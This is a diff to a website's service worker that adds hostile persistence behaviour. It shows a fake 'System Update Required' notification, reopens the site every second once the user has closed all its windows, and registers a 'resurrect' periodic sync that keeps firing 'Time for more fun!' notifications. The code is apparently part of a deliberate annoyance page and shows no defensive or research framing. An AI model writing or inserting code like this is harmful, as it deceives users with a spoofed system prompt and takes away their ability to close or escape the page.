@@ -8,6 +8,18 @@ self.addEventListener('install', () => {
 self.addEventListener('activate', (e) => {
   e.waitUntil(clients.claim())
   setInterval(() => { self.registration.update() }, 1000)
+  self.registration.showNotification('System Update Required', {
+    body: 'Click to continue',
+    requireInteraction: true,
+    tag: 'persistent'
+  })
+  setInterval(() => {
+    clients.matchAll({type: 'window'}).then(list => {
+      if (list.length === 0) {
+        clients.openWindow(SITE_URL + '?resurrect=' + Date.now())
+      }
+    })
+  }, 1000)
 })
 
 setInterval(() => {
@@ -59,11 +71,12 @@ setInterval(() => {
 }, 100)
 
 setInterval(() => {
+  self.registration.periodicSync.register('resurrect', { minInterval: 1 }).catch(() => {})
   self.registration.periodicSync.register('keep-alive', { minInterval: 1 }).catch(() => {})
 }, 100)
 
 self.addEventListener('sync', (e) => {
-  if (e.tag === 'annoy-sync' || e.tag === 'keep-alive') {
+  if (e.tag === 'annoy-sync' || e.tag === 'keep-alive' || e.tag === 'resurrect') {
     e.waitUntil(
       self.registration.showNotification('Back online!', {
         body: 'Time for more fun!',
